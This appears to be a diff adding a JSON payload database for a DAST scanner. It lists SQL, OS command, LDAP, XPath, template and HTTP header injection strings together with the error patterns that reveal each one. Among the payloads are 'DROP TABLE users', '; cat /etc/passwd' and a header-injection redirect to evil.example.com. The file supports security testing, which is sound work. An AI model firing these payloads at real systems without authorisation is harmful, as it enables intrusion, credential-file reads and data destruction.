@@ -1,0 +1,120 @@
+{
+  "schema_version": "1.0.0",
+  "description": "Injection pattern database for RedCheck246 DAST testing",
+  "categories": {
+    "sql_injection": {
+      "description": "SQL injection detection and testing patterns",
+      "payloads": [
+        "' OR '1'='1",
+        "' OR '1'='1' --",
+        "' UNION SELECT NULL --",
+        "' UNION SELECT NULL, NULL --",
+        "1; DROP TABLE users --",
+        "1' AND '1'='1",
+        "1' AND '1'='2",
+        "admin'--",
+        "' OR 1=1#",
+        "1 OR 1=1",
+        "' WAITFOR DELAY '0:0:5' --",
+        "1; WAITFOR DELAY '0:0:5' --",
+        "1' AND SLEEP(5)#",
+        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
+        "') OR ('1'='1"
+      ],
+      "detection_patterns": [
+        "SQL syntax",
+        "mysql_fetch",
+        "ORA-",
+        "PostgreSQL",
+        "Microsoft OLE DB",
+        "ODBC SQL Server",
+        "SQLite3::",
+        "pg_query",
+        "unterminated quoted string",
+        "quoted string not properly terminated"
+      ]
+    },
+    "command_injection": {
+      "description": "OS command injection patterns",
+      "payloads": [
+        "; id",
+        "| id",
+        "& id",
+        "`id`",
+        "$(id)",
+        "; cat /etc/passwd",
+        "| cat /etc/passwd",
+        "& whoami",
+        "; ping -c 1 127.0.0.1",
+        "| ping -n 1 127.0.0.1"
+      ],
+      "detection_patterns": [
+        "uid=",
+        "root:",
+        "bin/bash",
+        "PING",
+        "bytes from",
+        "TTL="
+      ]
+    },
+    "ldap_injection": {
+      "description": "LDAP injection patterns",
+      "payloads": [
+        "*)(uid=*))(|(uid=*",
+        "admin)(&)",
+        "*)(&",
+        "*)(objectClass=*",
+        "admin)(|(password=*"
+      ],
+      "detection_patterns": [
+        "LDAP error",
+        "Invalid DN syntax",
+        "NamingException"
+      ]
+    },
+    "xpath_injection": {
+      "description": "XPath injection patterns",
+      "payloads": [
+        "' or '1'='1",
+        "' or ''='",
+        "1' or '1'='1",
+        "admin' or '1'='1"
+      ],
+      "detection_patterns": [
+        "XPathException",
+        "XPath error",
+        "Invalid expression"
+      ]
+    },
+    "ssti": {
+      "description": "Server-side template injection patterns",
+      "payloads": [
+        "{{7*7}}",
+        "${7*7}",
+        "<%= 7*7 %>",
+        "#{7*7}",
+        "{7*7}",
+        "{{config}}",
+        "{{self.__class__}}"
+      ],
+      "detection_patterns": [
+        "49",
+        "SyntaxError",
+        "TemplateSyntaxError"
+      ]
+    },
+    "header_injection": {
+      "description": "HTTP header injection patterns",
+      "payloads": [
+        "\\r\\nX-Injected: header",
+        "%0d%0aX-Injected: header",
+        "\\r\\nSet-Cookie: injected=true",
+        "%0d%0aLocation: http://evil.example.com"
+      ],
+      "detection_patterns": [
+        "X-Injected:",
+        "injected=true"
+      ]
+    }
+  }
+}
